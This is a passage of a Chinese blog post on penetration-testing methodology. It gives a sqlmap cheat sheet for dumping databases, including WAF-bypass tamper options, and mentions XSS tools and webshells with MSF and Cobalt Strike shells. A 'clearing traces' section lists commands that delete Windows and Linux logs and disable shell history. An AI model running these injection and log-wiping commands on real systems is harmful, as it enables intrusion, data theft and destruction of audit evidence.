+<h4 id="1-3-NESSUS"><a href="#1-3-NESSUS" class="headerlink" title="1.3 NESSUS"></a>1.3 NESSUS</h4><p>实时更新插件的漏扫，很好用，就是激活流程麻烦。<br><a target="_blank" rel="noopener" href="https://www.wuyini.cn/765.html">https://www.wuyini.cn/765.html</a></p>
+<h4 id="1-4-Xray自动化的漏洞挖掘"><a href="#1-4-Xray自动化的漏洞挖掘" class="headerlink" title="1.4 Xray自动化的漏洞挖掘"></a>1.4 Xray自动化的漏洞挖掘</h4><p>burp+xray：<br>BurpSuite + Xray 被动扫描配置 - Ritte - 博客园<br>或者直接挂浏览器，点到哪里，扫到哪里<br>xray+各种漏扫联动</p>
+<h4 id="1-5-Fuzz"><a href="#1-5-Fuzz" class="headerlink" title="1.5 Fuzz"></a>1.5 Fuzz</h4><p>Fuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。<br>Discover Content是Burp中专门用于此目的的工具。<br>Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。<br>FuzzDB包含一些用于此目的的非常牛逼的字典。</p>
+<h3 id="2-挖掘漏洞"><a href="#2-挖掘漏洞" class="headerlink" title="2.挖掘漏洞"></a>2.挖掘漏洞</h3><h4 id="2-1-SQL注入"><a href="#2-1-SQL注入" class="headerlink" title="2.1 SQL注入"></a>2.1 SQL注入</h4><p>初步测试：见框就上，加 and 1&#x3D;1、and 1&#x3D;2、and 2&#x3D;1 or </p>
+<p>抓包爆破常用SQL注入payload字典，上burp intruder。</p>
+<p>注入六连：</p>
+<ol>
+<li><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.xx.com/?id=x&quot;">http://www.xx.com?id=x&quot;</a> 查询是否存在注入点</p>
+</li>
+<li><p>–dbs 检测站点包含哪些数据库</p>
+</li>
+<li><p>–current-db 获取当前的数据库名</p>
+</li>
+<li><p>–tables -D “db_name” 获取指定数据库中的表名 -D后接指定的数据库名称</p>
+</li>
+<li><p>–columns -T “table_name” -D “db_name” 获取数据库表中的字段</p>
+</li>
+<li><p>–dump -C “columns_name” -T “table_name” -D “db_name” 获取字段的数据内容</p>
+</li>
+</ol>
+<ul>
+<li><strong>cookie注入</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xx.com/xxx.asp&quot; --cookie &quot;id=XXX cookie&quot; --level 2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>post注入</strong></p>
+<p>步骤如下：</p>
+<ol>
+<li><p>打开burpsuite获取拦截信息（post），然后右键保存文件（post.txt）到指定目录下。</p>
+</li>
+<li><p>运行sqlmap并执行如下命令加载文件：</p>
+<p><code>sqlmap -r post.txt -p &quot;username&quot;</code></p>
+<p>-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p>
+<p>自动获取表单：–forms自动获取表单</p>
+<p>例如：<code>sqlmap -u http://www.xx.com/login.asp --forms</code></p>
+<p>指定参数搜索：–data</p>
+<p>例如：<code>sqlmap -u http://www.xx.com/login.asp --data &quot;username=1&quot;</code></p>
+</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">--purge  【重新扫描（--purge 删除原先对该目标扫描的记录】</span><br><span class="line">--tables 【获取表名】</span><br><span class="line">--dbs    【检测站点包含哪些数据库】</span><br><span class="line">--current-db   【获取当前的数据库名】</span><br><span class="line">--current-user 【检测当前用户】</span><br><span class="line">--is-dba 【判断站点的当前用户是否为数据库管理员】</span><br><span class="line">--batch  【默认确认，不询问你是否输入】</span><br><span class="line">--search 【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）】</span><br><span class="line">--threads 10 【线程，sqlmap线程最高设置为10】</span><br><span class="line">--level 3   【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5】</span><br><span class="line">--risk 3 【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全】</span><br><span class="line">-v 【详细的等级(0-6)</span><br><span class="line">0：只显示Python的回溯，错误和关键消息。</span><br><span class="line">1：显示信息和警告消息。</span><br><span class="line">2：显示调试消息。</span><br><span class="line">3：有效载荷注入。</span><br><span class="line">4：显示HTTP请求。</span><br><span class="line">5：显示HTTP响应头。</span><br><span class="line">6：显示HTTP响应页面的内容】</span><br><span class="line"></span><br><span class="line">--privileges 【查看权限】</span><br><span class="line">--tamper xx.py,cc.py 【防火墙绕过，后接tamper库中的py文件】</span><br><span class="line">--method &quot;POST&quot; --data &quot;page=1&amp;id=2&quot; 【POST方式提交数据】</span><br><span class="line">--threads number　　【采用多线程 后接线程数】</span><br><span class="line">--referer &quot;&quot; 【使用referer欺骗】</span><br><span class="line">--user-agent &quot;&quot; 【自定义user-agent】</span><br><span class="line">--proxy “目标地址″ 【使用代理注入】</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-2-XSS"><a href="#2-2-XSS" class="headerlink" title="2.2 XSS"></a>2.2 XSS</h4><p>xss漏洞原理分析与挖掘方法 - 知乎</p>
+<p>XSS小结 - 先知社区</p>
+<p>2020跨站点脚本[xss]速查表|雨苁</p>
+<p>XSSer自动化工具</p>
+<p>XSStrike 自动化绕过WAF</p>
+<p>XSS生成：<a target="_blank" rel="noopener" href="http://xssor.io/">http://xssor.io</a></p>
+<h2 id="漏洞利用getshgell"><a href="#漏洞利用getshgell" class="headerlink" title="漏洞利用getshgell"></a>漏洞利用getshgell</h2><p>常用的漏洞利用工具如下：</p>
+<p>SQL注入 ——&gt; Sqlmap</p>
+<p>XSS跨站脚本——&gt; Beef-XSS</p>
+<p>抓包改包工具——&gt; Burpsuite工具 、 Fidder抓包软件</p>
+<p>文件上传漏洞，上传漏洞的话，我们一般会上传一句话木马上去，进而再获得webshell，传送门——&gt; Webshell和一句话木马</p>
+<p>但是，获得了webshell后，一般权限很低，所以我们需要提权，</p>
+<p>可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用 、 Msfvenonm生成一个后门木马。</p>
+<p>也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用。</p>
+<p>也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权。</p>
+<h2 id="后渗透（权限提升）"><a href="#后渗透（权限提升）" class="headerlink" title="后渗透（权限提升）"></a>后渗透（权限提升）</h2><p>见权限提升的文章</p>
+<h2 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h2><p>Windows系统</p>
+<p>1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹</p>
+<p>2：如果3389远程登录过，需要清除mstsc痕迹</p>
+<p>3：执行命令清除日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del %WINDR%\* .log /a/s/q/f</span><br></pre></td></tr></table></figure>
+
+<p>4：如果是web应用，找到web日志文件，删除</p>
+<p>Linux系统</p>
+<p>1：如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export HISTFILE=/dev/null export HISTSIZE=0</span><br></pre></td></tr></table></figure>
+
+<p>2：删除 &#x2F;var&#x2F;log 目录下的日志文件</p>
+<p>3：如果是web应用，找到web日志文件，删除</p>
+<h2 id="撰写报告"><a href="#撰写报告" class="headerlink" title="撰写报告"></a>撰写报告</h2></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">ccb</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93')">渗透测试全流程</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=渗透测试全流程&amp;url=https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">15</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">基础概念与信息收集</div></div></a></div><div class="next-post pull-right"><a href="/posts/hello-world"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Hello World</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86" title="基础概念与信息收集"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">基础概念与信息收集</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87" title="SQL注入-WAF绕过"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">SQL注入-WAF绕过</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.%20XXE%E6%BC%8F%E6%B4%9E" title="XXE"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">XXE</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E" title="逻辑漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">逻辑漏洞</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" title="反序列化漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">反序列化漏洞</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20CRLF%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8F%8D%E5%BC%B9%E5%9E%8BXSS%EF%BC%89" title="CRLF注入漏洞（反弹型XSS）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">CRLF注入漏洞（反弹型XSS）</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">渗透测试全流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%AE%E6%A0%87%E7%A1%AE%E8%AE%A4"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 目标确认</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">1.1 域名注册信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-DNS%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">1.2 DNS信息查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E6%B5%8B%E8%AF%95%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">1.3 测试域传送漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E4%B8%9A%E5%8A%A1%E7%9B%B8%E5%85%B3"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">1.4 业务相关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-OSINT-%E5%85%AC%E5%BC%80%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. OSINT 公开情报收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E7%A4%BE%E5%B7%A5%E6%8A%80%E5%B7%A7"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">2.1 社工技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8EOSINT"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">2.2 搜索引擎OSINT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%9E%E7%94%A8%E6%8F%92%E4%BB%B6"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">2.3 浏览器实用插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E4%B9%8C%E4%BA%91%E5%92%8Ccnvd"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">2.4 乌云和cnvd</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-x3D-x3D-%E6%89%93%E7%82%B9-x3D-x3D"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. &#x3D;&#x3D;打点&#x3D;&#x3D;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">主动探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 主动扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%88-x3D-x3D-nmap-x3D-x3D-%EF%BC%89"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">1.1 常见服务漏洞（&#x3D;&#x3D;nmap&#x3D;&#x3D;）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">1.2 常见端口漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-WAF-%E5%8F%8A-bypass"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">1.3 WAF 及 bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E7%9B%AE%E5%BD%95%E3%80%81%E5%90%8E%E5%8F%B0%E5%92%8C%E6%95%8F%E6%84%9F%E8%B7%AF%E5%BE%84%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">1.4 目录、后台和敏感路径文件扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BA%BA%E5%B7%A5%E6%B5%8F%E8%A7%88-%E9%80%90%E4%B8%AA%E8%AF%B7%E6%B1%82burp"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 人工浏览\逐个请求burp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.自动化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 漏洞扫描工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-Nikto-Web%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">1.1 Nikto Web服务漏洞扫描器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-AWVS%E6%BC%8F%E6%89%AB"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">1.2 AWVS漏扫</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-NESSUS"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">1.3 NESSUS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-Xray%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">1.4 Xray自动化的漏洞挖掘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-Fuzz"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">1.5 Fuzz</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.挖掘漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">2.1 SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-XSS"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2.2 XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8getshgell"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用getshgell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">后渗透（权限提升）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E7%97%95%E8%BF%B9"><span class="toc-number">1.6.</span> <span class="toc-text">清除痕迹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%92%B0%E5%86%99%E6%8A%A5%E5%91%8A"><span class="toc-number">1.7.</span> <span class="toc-text">撰写报告</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/hello-world" title="Hello World">Hello World</a><time datetime="2023-10-05T11:40:46.695Z" title="Created 2023-10-05 19:40:46">2023-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93" title="渗透测试全流程">渗透测试全流程</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86" title="基础概念与信息收集">基础概念与信息收集</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87" 